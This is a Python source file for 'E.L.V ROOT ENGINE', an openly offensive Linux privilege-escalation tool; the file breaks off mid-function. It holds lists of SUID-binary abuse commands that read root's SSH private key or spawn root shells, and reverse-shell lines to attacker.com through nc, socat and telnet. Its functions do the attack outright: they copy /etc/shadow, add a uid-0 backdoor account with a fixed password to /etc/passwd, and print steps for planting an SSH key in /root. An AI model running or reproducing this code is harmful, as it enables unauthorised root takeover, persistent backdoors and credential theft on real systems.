#!/usr/bin/env python3
# E.L.V ROOT ENGINE v1.0.0 ULTIMATE
#
# Copyright (C) 2026 HxN (NONAME-ELV)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from __future__ import print_function
from datetime import datetime
from sys import exit, argv
from subprocess import call
import os
import getpass
import socket
import platform
import argparse
import textwrap
import csv
import shutil
import pwd
import grp
import sys

__author__ = "HxN"
__version__ = "3.8.1"
__license__ = "GPLv3"

defaults = [
    "arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh",
    "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount",
    "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount",
    "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp",
    "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec",
    "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su",
    "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount",
    "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL",
    "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper",
    "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"
]

suid_for_read = {
    'arp': '-> arp -v -f "/root/.ssh/id_rsa"',
    'base32': '-> base32 "/root/.ssh/id_rsa" | base32 --decode',
    'base64': '-> base64 "/root/.ssh/id_rsa" | base64 --decode',
    'cat': '-> cat /root/.ssh/id_rsa',
    'cut': '-> cut -d "" -f1 "/root/.ssh/id_rsa"',
    'date': '-> date -f "/root/.ssh/id_rsa"',
    'dd': '-> dd if="/root/.ssh/id_rsa"',
    'dialog': '-> dialog --textbox "/root/.ssh/id_rsa" 0 0',
    'diff': '-> diff --line-format=%L /dev/null "/root/.ssh/id_rsa"',
    'eqn': '-> eqn "/root/.ssh/id_rsa"',
    'expand': '-> expand "/root/.ssh/id_rsa"',
    'file': '-> file -f "/root/.ssh/id_rsa"',
    'fmt': '-> fmt -999 "/root/.ssh/id_rsa"',
    'fold': '-> fold -w99999999 "/root/.ssh/id_rsa"',
    'grep': '-> grep "" "/root/.ssh/id_rsa"',
    'hd': '-> hd "/root/.ssh/id_rsa"',
    'head': '-> head -c1G "/root/.ssh/id_rsa"',
    'hexdump': '-> hexdump -C "/root/.ssh/id_rsa"',
    'highlight': '-> highlight --no-doc --failsafe "/root/.ssh/id_rsa"',
    'iconv': '-> iconv -f 8859_1 -t 8859_1 "/root/.ssh/id_rsa"',
    'ip': '-> ip -force -batch "/root/.ssh/id_rsa"',
    'jq': '-> jq -Rr . "/root/.ssh/id_rsa"',
    'ksshell': '-> ksshell -i "/root/.ssh/id_rsa"',
    'less': '-> less "/root/.ssh/id_rsa"',
    'look': '-> look "" "/root/.ssh/id_rsa"',
    'lwp-request': '-> lwp-request "file://root/.ssh/id_rsa"',
    'more': '-> more "/root/.ssh/id_rsa"',
    'nl': '-> nl -bn -w1 -s "" "/root/.ssh/id_rsa"',
    'od': '-> od -An -c -w9999 "/root/.ssh/id_rsa"',
    'pg': '-> pg "/root/.ssh/id_rsa"',
    'sed': '-> sed "" "/root/.ssh/id_rsa"',
    'soelim': '-> soelim "/root/.ssh/id_rsa"',
    'sort': '-> sort -m "/root/.ssh/id_rsa"',
    'x86_64-linux-gnu-strings': '-> strings "/root/.ssh/id_rsa"',
    'sysctl': '-> sysctl -n "/../../root/.ssh/id_rsa"',
    'tac': '-> tac -s "RANDOM" "/root/.ssh/id_rsa"',
    'tail': '-> tail -c1G "/root/.ssh/id_rsa"',
    'ul': '-> ul "/root/.ssh/id_rsa"',
    'unexpand': '-> unexpand -t99999999 "/root/.ssh/id_rsa"',
    'uniq': '-> uniq "/root/.ssh/id_rsa"',
    'uuencode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode',
    'uudecode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode',
    'xxd': '-> xxd "/root/.ssh/id_rsa" | xxd -r',
    'xz': '-> xz -c "/root/.ssh/id_rsa" | xz -d',
    'zsoelim': '-> zsoelim "/root/.ssh/id_rsa"'
}

suid_manual = {
    'aria2c': '-> COMMAND=\'id\'\n-> TF=$(mktemp)\n-> echo "$COMMAND" > $TF\n-> chmod +x $TF\n\n-> aria2c --on-download-error=$TF http://x',
    'restic': '-> RHOST=attacker.com\n-> RPORT=12345\n-> LFILE=file_or_dir_to_get\n-> NAME=backup_name\n\n-> restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
    'shuf': '-> LFILE=file_to_write\n\n-> shuf -e DATA -o "$LFILE"\n',
    'tee': '-> LFILE=file_to_write\n\n-> echo DATA | ./tee -a "$LFILE"'
}

suid_manual2 = {
    'busybox': '-> busybox sh',
    'rpm': '-> rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    'rsync': '-> rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    'systemctl': '-> TF=$(mktemp).service\n-> echo \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n\n-> systemctl link $TF\n\n-> systemctl enable --now $TF',
    'dmsetup': "-> dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n\n-> dmsetup ls --exec '/bin/sh -p -s'",
    'emacs-gtk': '-> emacs -Q -nw --eval \'(term "/bin/sh -p")\'',
    'gimp-2.10': '-> gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'gtester': '-> TF=$(mktemp)\n-> echo \'#!/bin/sh -p\' > $TF\n-> echo \'exec /bin/sh -p 0<&1\' >> $TF\n-> chmod +x $TF\n\n-> gtester -q $TF',
    'make': '-> make -s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
    'nano': '-> nano\n^R^X\nreset; sh 1>&0 2>&0',
    'openssl': '-> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n-> openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
    'perl': '-> perl -e \'exec "/bin/sh";\'',
    'pico': '-> pico\n^R^X\nreset; sh 1>&0 2>&0',
    'tftp': '-> RHOST=attacker.com\n\n-> tftp $RHOST\n-> put file_to_send',
    'vim.basic': '-> vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'watch': '-> watch -x sh -c \'reset; exec sh 1>&0 2>&0\''
}

suid_manual3 = {
    'bash': '-> bash -p',
    'chroot': '-> chroot / /bin/sh -p',
    'bsd-csh': '-> bsd-csh -b',
    'dash': '-> dash -p',
    'docker': '-> docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'env': '-> env /bin/sh -p',
    'expect': '-> expect -c "spawn /bin/sh -p;interact"',
    'find': '-> find . -exec /bin/sh -p \\; -quit',
    'flock': '-> flock -u / /bin/sh -p',
    'gdb': '-> gdb -q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    'ionice': '-> ionice /bin/sh -p',
    'ksh2020': '-> ksh -p',
    'ld.so': '-> ld.so /bin/sh -p',
    'logsave': '-> logsave /dev/null /bin/sh -i -p',
    'nice': '-> nice /bin/sh -p',
    'node': '-> node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
    'nohup': '-> nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
    'php7.4': '-> php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python2.7': '-> python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'python3.8': '-> python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'rlwrap': '-> rlwrap -H /dev/null /bin/sh -p',
    'run-part': '-> run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    'setarch': '-> setarch $(arch) /bin/sh -p',
    'start-stop-daemon': '-> start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p',
    'stdbuf': '-> stdbuf -i0 /bin/sh -p',
    'strace': '-> strace -o /dev/null /bin/sh -p',
    'taskset': '-> taskset 1 /bin/sh -p',
    'time': '-> time /bin/sh -p',
    'timeout': '-> timeout 7s /bin/sh -p',
    'unshare': '-> unshare -r /bin/sh',
    'xargs': '-> xargs -a /dev/null sh -p',
    'zsh': '-> zsh'
}

suid_mody = ["cp", "mv"]
suid_mody2 = ["chmod", "chown"]
suid_download = ["curl", "wget", "lwp-download"]

suid_lim = {
    'awk': '-> awk \'BEGIN {system("/bin/sh")}\'',
    'byebug': '-> TF=$(mktemp)\n -> echo \'system("/bin/sh")\' > $TF\n\n-> byebug $TF\n-> continue',
    'ed': '-> ed\n!/bin/sh',
    'gawk': '-> gawk \'BEGIN {system("/bin/sh")}\'',
    'git': '-> PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
    'iftop': '-> iftop\n!/bin/sh',
    'ldconfig': '-> TF=$(mktemp -d)\n-> echo "$TF" > "$TF/conf"\n\n-> ldconfig -f "$TF/conf"',
    'lua': '-> lua -e \'os.execute("/bin/sh")\'',
    'mawk': '-> mawk \'BEGIN {system("/bin/sh")}\'',
    'mysql': "-> mysql -e '\\! /bin/sh'",
    'nawk': '-> nawk \'BEGIN {system("/bin/sh")}\'',
    'nc': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> nc -e /bin/sh $RHOST $RPORT',
    'nmap': '-> TF=$(mktemp)\n-> echo \'os.execute("/bin/sh")\' > $TF\n\n-> nmap --script=$TF',
    'pic': '-> pic -U\n.PS\nsh X sh X',
    'pry': '-> pry\nsystem("/bin/sh")',
    'rvim': '-> rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'scp': '-> TF=$(mktemp)\n-> echo \'sh 0<&2 1>&2\' > $TF\n-> chmod +x "$TF"\n\n-> scp -S $TF a b:',
    'socat': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
    'sqlite3': "-> sqlite3 /dev/null '.shell /bin/sh'",
    'tar': '-> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    'telnet': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> telnet $RHOST $RPORT\n^]\n!/bin/sh',
    'zip': "-> TF=$(mktemp -u)\n\n-> zip $TF /etc/hosts -T -TT 'sh #'\n-> sudo rm $TF"
}

suid_exec = [
    "bash", "chroot", "bsd-csh", "dash", "docker", "env", "expect", "find",
    "flock", "gdb", "ionice", "ksh2020", "ld.so", "logsave", "nice", "node",
    "nohup", "php7.4", "python2.7", "python3.8", "rlwrap", "run-parts",
    "setarch", "start-stop-daemon", "stdbuf", "strace", "taskset", "time",
    "timeout", "unshare", "xargs", "zsh"
]

php_files = [
    "wp-config.php", "config.php", "connect.php", "wp-config.php",
    "configuration.php", "settings.php", "database.php", "db.php",
    "db_conn.php", "wp-config-sample.php"
]
php_files2 = []
redis_lines = []

capa_default = [
    "mtr-packet", "gnome-keyring-daemon", "ping", "fping",
    "traceroute6.iputils", "gst-ptp-helper"
]

capa_exec = {
    "gdb": "-> gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit\n",
    "node": "-> node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n",
    "perl": "-> perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n",
    "php": "-> php -r 'posix_setuid(0); system(\"/bin/sh\");'\n",
    "ruby": "-> ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'\n"
}
write_array = []

def print_gradient_banner():
    text = "E̸L̸V̶ ̶R̷O̷O̵T̴ ̸E̴N̸G̶I̴N̵E̷ ̴v̵3̵.̵8̵.̵1̵ ̴U̵L̵T̵I̵M̵A̵T̵E̵"
    r1, g1, b1 = 255, 0, 127
    r2, g2, b2 = 0, 245, 212
    chars = list(text)
    total = len(chars)
    if total > 0:
        for i, c in enumerate(chars):
            r = int(r1 + (r2 - r1) * i / max(total - 1, 1))
            g = int(g1 + (g2 - g1) * i / max(total - 1, 1))
            b = int(b1 + (b2 - b1) * i / max(total - 1, 1))
            sys.stdout.write(f"\033[38;2;{r};{g};{b}m{c}")
    print("\033[0m\n")

class Bcolors:
    OKBLUE = '\033[92m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ORANGE = '\033[33m'

class Nocolors:
    OKBLUE = '\033[92m'
    OKGREEN = '\033[92m'
    WARNING = '\033[92m'
    FAIL = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ORANGE = '\033[92m'

class User:
    def __init__(self):
        self.name = getpass.getuser()
        try:
            from pathlib import Path
            self.home = str(Path.home())
        except:
            self.home = os.path.expanduser("~")
        self.user = os.geteuid()
        self.group = os.getegid()
        self.real = os.getgid()
        self.list = os.getgroups()
        self.shell = os.environ.get('SHELL', '/bin/sh')

class Victim:
    def __init__(self):
        self.host = socket.gethostname()
        try:
            import distro
            self.distro = distro.linux_distribution()
        except Exception:
            self.distro = self._from_os_release()
        self.arch = platform.architecture()[0]
        self.pross = platform.processor()
        self.kernel = platform.release()

    def _from_os_release(self):
        info = {"name": "Linux", "version": "Unknown", "codename": "Unknown"}
        try:
            with open("/etc/os-release") as f:
                data = {}
                for line in f:
                    if "=" in line:
                        k, v = line.strip().split("=", 1)
                        data[k] = v.strip('"')
            info["name"] = data.get("NAME", "Linux")
            info["version"] = data.get("VERSION_ID", data.get("VERSION", "Unknown"))
            info["codename"] = data.get("VERSION_CODENAME",
                                       data.get("PRETTY_NAME", "Unknown"))
        except Exception:
            pass
        return (info["name"], info["version"], info["codename"])

def arguments(argv):
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''\
            usage examples:
              ./elv.py -a
              ./elv.py -m
              ./elv.py -v
              ./elv.py -b

            Specific categories usage examples:
              ./elv.py -a -s
              ./elv.py -m -w
              ./elv.py -a -s -p
              ./elv.py -m -w -c -p
              ./elv.py -a -s -c -p -f

              *Use the above arguments with -n to disable color.
              ''')
    )
    parser.add_argument("-v", "--version", action='store_true', dest='version', help="show version and exit")
    parser.add_argument("-a", "--auto", action='store_true', dest='auto', help="automated privilege escalation process")
    parser.add_argument("-m", "--manual", action='store_true', dest='manual', help="system enumeration")
    parser.add_argument("-n", "--nocolor", action='store_true', dest='color', help="disable color")
    parser.add_argument("-b", "--banner", action='store_true', dest='banner', help="show banner and exit")
    parser.add_argument("-s", "--suid", action='store_true', dest='suid', help="suid binary enumeration")
    parser.add_argument("-w", "--weak", action='store_true', dest='weak', help="weak permissions of files enumeration")
    parser.add_argument("-p", "--php", action='store_true', dest='php', help="PHP configuration files enumeration")
    parser.add_argument("-c", "--capabilities", action='store_true', dest='capa', help="capabilities enumeration")
    parser.add_argument("-f", "--full-writables", action='store_true', dest='full', help="world writable files enumeration")
    args = parser.parse_args()
    if len(argv) == 1:
        parser.print_help()
        exit()
    return args

def check_4_args(args):
    arg_flag = "nothing"
    if args.version and not args.manual:
        if args.version and not args.auto:
            if args.version and not args.banner:
                if args.version and not args.suid:
                    if args.version and not args.weak:
                        if args.version and not args.php:
                            if args.version and not args.capa:
                                if args.version and not args.full:
                                    arg_flag = "version"
    elif args.manual and not args.version:
        if args.manual and not args.auto:
            if args.manual and not args.banner:
                arg_flag = "manual"
    elif args.auto and not args.version:
        if args.auto and not args.manual:
            if args.auto and not args.banner:
                arg_flag = "auto"
    elif args.banner and not args.version:
        if args.banner and not args.auto:
            if args.banner and not args.manual:
                if args.banner and not args.suid:
                    if args.banner and not args.weak:
                        if args.banner and not args.php:
                            if args.banner and not args.capa:
                                if args.banner and not args.full:
                                    arg_flag = "banner"
    return arg_flag

def check_4_args2(args, argv):
    arg_flag = "nothing"
    if len(argv) == 2:
        if args.auto or args.manual:
            arg_flag = "all"
    elif len(argv) == 3:
        if (args.auto and args.color) or (args.manual and args.color):
            arg_flag = "all"
    return arg_flag

def test_date():
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    return dt_string

def find_whoami(user, user_id, group_id, real_id, other_groups, home, shell, bold, blue, warning, fail, endc):
    print(bold + blue + '[+] User:\n\n' + endc + user + '\n\n')
    if user != "root":
        print(bold + blue + '[+] ' + user + ' Details:\n' + endc)
        print(warning + 'User id: ' + endc + str(user_id) + warning + '\nGroup id: ' + endc + str(group_id) + warning + '\nReal id: ' + endc + str(real_id) + '\n' + warning + 'Supplemental groups: ' + endc + str(other_groups))
        print(warning + 'Home directory: ' + endc + home)
        print(warning + 'Type of shell: ' + endc + shell + '\n')
    else:
        print(bold + blue + '[+] ' + user + ' Details:\n' + endc)
        call(["id"])
        print('\n')
        print(bold + fail + '[!] You are already root!' + endc + '\n')
        exit()

def find_victim(bold, blue, warning, endc, host, distro, kernel, pross, arch):
    print(bold + blue + '\n[+] Victim:\n\n' + endc + host + '\n\n')
    print(bold + blue + '[+] ' + host + ' Details:\n' + endc)
    print(warning + 'Distribution: ' + endc + distro[0])
    print(warning + 'Version: ' + endc + distro[1])
    print(warning + 'Nickname: ' + endc + distro[2])
    print(warning + 'Kernel Version: ' + endc + kernel)
    print(warning + 'Processor: ' + endc + pross)
    print(warning + 'Architecture: ' + endc + arch + '\n')

def ip_msg(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> The following example only works for Linux with CONFIG_NET_NS=y and you can take root's privileges.\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)
    print(bold + "-> ip netns add foo\n" + endc)
    print(bold + "-> ip netns exec foo /bin/sh -p\n" + endc)
    print(bold + "-> ip netns delete foo\n\n" + endc)

def root_msg(bold, green, endc):
    print(bold + green + "[!] Shell Opened! You are root now! :)\n" + endc)

def important_msg(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Run the following command and read files from root!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)

def important_msg2(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Follow the below example and create files with root's permissions/ownership!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)

def important_msg3(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Maybe not sure, you can try to follow the below example and take root's privileges!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)

def important_msg5(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> If capability setted CAP_SETUID, you can use the following example...\n" + endc)
    print(bold + blue + "[!] Example:\n" + endc)

def important_msg6(bold, green, blue, fail, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Visit the below link and find the exploit!\n" + endc)
    print(bold + blue + "[*] Link:\n" + endc)

def important_msg7(bold, blue, warning, endc):
    print(bold + blue + "[!] Advice:\n" + endc)
    print(bold + warning + "-> Maybe, Not Sure! Use the following capability example and take root's privileges\n" + endc)
    print(bold + blue + "[!] Example:\n" + endc)

def banner_msg(filename, bold, green, endc):
    print(bold + green + "[!] Found weak permissions of {} file".format(filename) + endc + '\n')

def banner_msg2(filename, bold, green, endc):
    print(bold + green + "[!] Found ownership misconfiguration of {} file".format(filename) + endc + '\n')

def banner_msg3(filename, bold, green, endc):
    print(bold + green + "[!] Found group misconfiguration of {} file".format(filename) + endc + '\n')

def banner_msg4(filename, bold, warning, endc):
    print(bold + warning + "[!] Access in " + filename + '\n' + endc)

def banner_msg5(filename, bold, green, endc):
    print(bold + green + "\n[!] Found php configuration file:\n\n" + endc + filename + "\n")

def banner_msg6(filename, bold, green, endc):
    print(bold + green + "[!] Found weak permissions of {} directory\n".format(filename) + endc)

def banner_msg7(filename, flag, bold, blue, warning, endc, orange):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Read the {} file and try to crack any hash in order to take root's privileges!\n".format(filename) + endc)
    if flag == "manual":
        print(bold + blue + "[*] Example:\n" + endc)
    else:
        if filename == "/etc/shadow":
            copy_shadow(filename, bold, blue, warning, endc, orange)

def banner_msg8(filename, bold, green, endc):
    print(bold + green + "[!] Found ownership misconfiguration of {} directory".format(filename) + endc + '\n')

def banner_msg9(filename, bold, green, endc):
    print(bold + green + "[!] Found group misconfiguration of {} directory".format(filename) + endc + '\n')

def banner_msg10(filename, bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Maybe not Sure, Visit the below link and edit {} file in order to take root's privileges\n" + endc)
    print(bold + blue + "[~] Link:\n" + endc)

def copy_shadow(filename, bold, blue, warning, endc, orange):
    try:
        shutil.copyfile('/etc/shadow', '/tmp/shadow')
        filename2 = "/tmp/shadow"
        print(bold + orange + "[!] {} file copied to {}\n".format(filename, filename2) + endc)
        print(bold + "-> cat /tmp/shadow\n" + endc)
    except (FileNotFoundError, PermissionError, OSError):
        print(bold + warning + "[!] Can't copy {} (file not found or no permission)\n".format(filename) + endc)

def readelf_msg(bold, blue, warning, endc):
    print(bold + blue + "[*] Important Notice:\n" + endc)
    print(bold + warning + "-> readelf is a tool which displays information about elf files! You can use it only for elf files...\n" + endc)

def job_finish(flag, bold, blue, green, endc):
    if flag == "auto":
        color = green
    else:
        color = blue
    print(bold + color + '[!] Scanning finished...' + endc)
    exit()

def exim_priv_esc(bold, green, blue, fail, warning, endc):
    important_msg6(bold, green, blue, fail, warning, endc)
    print(bold + warning + '-> https://www.exploit-db.com/exploits/46996\n\n' + endc)

def curl_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use curl to download keys into /root:" + endc)
    print("         curl -o /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")

def wget_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use wget to download keys into /root:" + endc)
    print("         wget -O /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")

def lwp_path(bold, blue, warning, endc):
    print(bold + warning + "-> Create a rsa keys to your local machines:" + endc)
    print("         ssh-keygen -t rsa\n")
    print(bold + warning + "-> Open a web server in the same directory of rsa keys like:" + endc)
    print("         python3 -m http.server 8080\n")
    print(bold + warning + "-> Use lwp-download to download keys into /root:" + endc)
    print("         lwp-download http://<your_ip>:<your_port>/id_rsa.pub /root/.ssh/authorized_keys\n")
    print(bold + warning + "-> Try to connect to victim's machine with your id_rsa private key:" + endc)
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")

def curl_priv_esc(bold, blue, warning, endc):
    important_msg3(bold, blue, warning, endc)
    curl_path(bold, blue, warning, endc)

def wget_priv_esc(bold, blue, warning, endc):
    important_msg3(bold, blue, warning, endc)
    wget_path(bold, blue, warning, endc)

def lwp_downlaod_priv_esc(bold, blue, warning, endc):
    important_msg3(bold, blue, warning, endc)
    lwp_path(bold, blue, warning, endc)

def rake_priv_esc(bold, blue, warning, endc):
    important_msg3(bold, blue, warning, endc)
    command = '''-> rake -p '`/bin/sh 1>&0`'
    '''
    print(command + '\n')

def readelf_priv_esc(bold, blue, warning, endc):
    readelf_msg(bold, blue, warning, endc)
    print(bold + blue + "[*] Example:\n" + endc)
    print('-> lfile=file_to_read\n')
    print('-> readelf -a @$lfile\n\n')

def bash_priv_esc():
    call(["bash", "-p"])

def chroot_priv_esc():
    call(["chroot", "/", "/bin/sh", "-p"])

def csh_priv_esc():
    call(["csh", "-b"])

def dash_priv_esc():
    call(["dash", "-p"])

def docker_priv_esc():
    call(["docker", "run", "-v", "/:/mnt", "--rm", "-it", "alpine", "chroot", "/mnt", "sh"])

def env_priv_esc():
    call(["env", "/bin/sh", "-p"])

def expect_priv_esc():
    os.system('expect -c "spawn /bin/sh -p;interact"')

def find_priv_esc():
    os.system('find . -exec /bin/sh -p \\; -quit')

def flock_priv_esc():
    call(["flock", "-u", "/", "/bin/sh", "-p"])

def gdb_priv_esc():
    command = '''
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    '''
    os.system(command)

def ionice_priv_esc():
    call(["ionice", "/bin/sh", "-p"])

def ksh_priv_esc():
    call(["ksh", "-p"])

def ld_so_priv_esc():
    call(["ld.so", "/bin/sh", "-p"])

def logsave_priv_esc():
    call(["logsave", "/dev/null", "/bin/sh", "-i", "-p"])

def nice_priv_esc():
    call(["nice", "/bin/sh", "-p"])

def node_priv_esc():
    command = '''
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
    '''
    os.system(command)

def nohup_priv_esc():
    command = '''
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
    '''
    os.system(command)

def php_priv_esc():
    command = '''
php -r "pcntl_exec('/bin/sh', ['-p']);"
    '''
    os.system(command)

def python_priv_esc():
    command = '''
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    os.system(command)

def python3_priv_esc():
    command = '''
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    os.system(command)

def rlwrap_priv_esc():
    call(["rlwrap", "-H", "/dev/null", "/bin/sh", "-p"])

def run_parts_priv_esc():
    command = '''
run-parts --new-session --regex '^sh$' /bin --arg='-p'
    '''
    os.system(command)

def setarch_priv_esc():
    os.system('setarch $(arch) /bin/sh -p')

def start_stop_daemon_priv_esc():
    command = '''
start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p
    '''
    os.system(command)

def stdbuf_priv_esc():
    call(["stdbuf", "-i0", "/bin/sh", "-p"])

def strace_priv_esc():
    call(["strace", "-o", "/dev/null", "/bin/sh", "-p"])

def taskset_priv_esc():
    call(["taskset", "1", "/bin/sh", "-p"])

def time_priv_esc():
    call(["time", "/bin/sh", "-p"])

def timeout_priv_esc():
    os.system('timeout 7s /bin/sh -p')

def unshare_priv_esc():
    call(["unshare", "-r", "/bin/sh"])

def xargs_priv_esc():
    call(["xargs", "-a", "/dev/null", "sh", "-p"])

def zsh_priv_esc():
    call(["zsh"])

def config_msg(bold, blue, warning, endc):
    print(bold + warning + "[!] Try to configure /etc/passwd file...\n" + endc)
    print(bold + warning + "[!] Try to create a new user...\n" + endc)

def config_msg2(filename, bold, blue, warning, endc):
    print(bold + blue + '[+] Advice:\n' + endc)
    print(bold + warning + "-> Follow the below example in order to edit the {} file and take root's privileges\n".format(filename) + endc)
    print(bold + blue + '[*] Example:\n' + endc)

def other_msg(flag, bold, green, blue, warning, endc):
    if flag != 'manual':
        print(bold + green + "[!] Done! Use the following credentials in order to take root's privileges!\n" + endc)
    print(bold + warning + " -> Credentials:\n" + endc)
    print(bold + blue + "------------------------------" + endc)
    print(bold + blue + "|   Username  |   Password   |" + endc)
    print(bold + blue + "------------------------------" + endc)
    print(bold + blue + "| " + bold + green + " superuser" + bold + blue + "  | " + bold + green + "password1234" + bold + blue + " |" + endc)
    print(bold + blue + "------------------------------\n" + endc)

def cp_priv_esc(flag, bold, green, blue, warning, endc):
    try:
        shutil.copyfile('/etc/passwd', '/tmp/passwd')
        f = open('/tmp/passwd', 'a+')
        f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash\n')
        f.close()
        os.system("cp /tmp/passwd /etc/passwd")
        other_msg(flag, bold, green, blue, warning, endc)
    except (FileNotFoundError, PermissionError, OSError):
        print(bold + warning + "[!] Can't access /etc/passwd\n" + endc)

def mv_priv_esc(flag, bold, green, blue, warning, endc):
    try:
        shutil.copyfile('/etc/passwd', '/tmp/passwd')
        f = open('/tmp/passwd', 'a+')
        f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash\n')
        f.close()
        os.system("mv /tmp/passwd /etc/passwd")
        other_msg(flag, bold, green, blue, warning, endc)
    except (FileNotFoundError, PermissionError, OSError):
        print(bold + warning + "[!] Can't access /etc/passwd\n" + endc)

def auto_chmod_msg(bold, green, blue, warning, endc):
    print(bold + green + "[!] Permissions of /root changed! You have access on it!\n" + endc)
    print(bold + blue + "-> Directory: /root\n" + endc)

def auto_chown_msg(bold, green, blue, warning, endc):
    print(bold + green + "[!] UID and GID of /root changed! You have access on it!" + endc)
    print(bold + blue + "-> Directory: /root" + endc)

def chmod_priv_esc(bold, green, blue, warning, endc):
